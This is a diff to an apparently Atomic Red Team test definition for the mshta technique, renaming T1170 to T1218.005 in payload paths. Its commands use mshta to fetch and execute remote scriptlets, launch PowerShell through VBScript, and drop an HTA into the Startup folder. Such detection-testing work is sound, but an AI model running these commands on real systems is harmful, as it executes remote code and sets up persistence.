@@ -11,7 +11,7 @@ atomic_tests:
     file_url:
       description: location of the payload
       type: Url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/mshta.sct
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct
   executor:
     command: |
       mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();
@@ -26,7 +26,7 @@ atomic_tests:
   - windows
   executor:
     command: |
-      mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -noexit -file PathToAtomicsFolder\T1170\src\powershell.ps1"":close")
+      mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -noexit -file PathToAtomicsFolder\T1218.005\src\powershell.ps1"":close")
     name: command_prompt
 - name: Mshta Executes Remote HTML Application (HTA)
   auto_generated_guid: c4b97eeb-5249-4455-a607-59f95485cb45
@@ -38,11 +38,11 @@ atomic_tests:
     temp_file:
       description: temp_file location for hta
       type: string
-      default: $env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1170.hta
+      default: $env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta
     hta_url:
       description: URL to HTA file for execution
       type: string
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta
   executor:
     command: |
       $var =Invoke-WebRequest "#{hta_url}"
@@ -51,4 +51,3 @@ atomic_tests:
     cleanup_command: |
       remove-item "#{temp_file}" -ErrorAction Ignore
     name: powershell
-
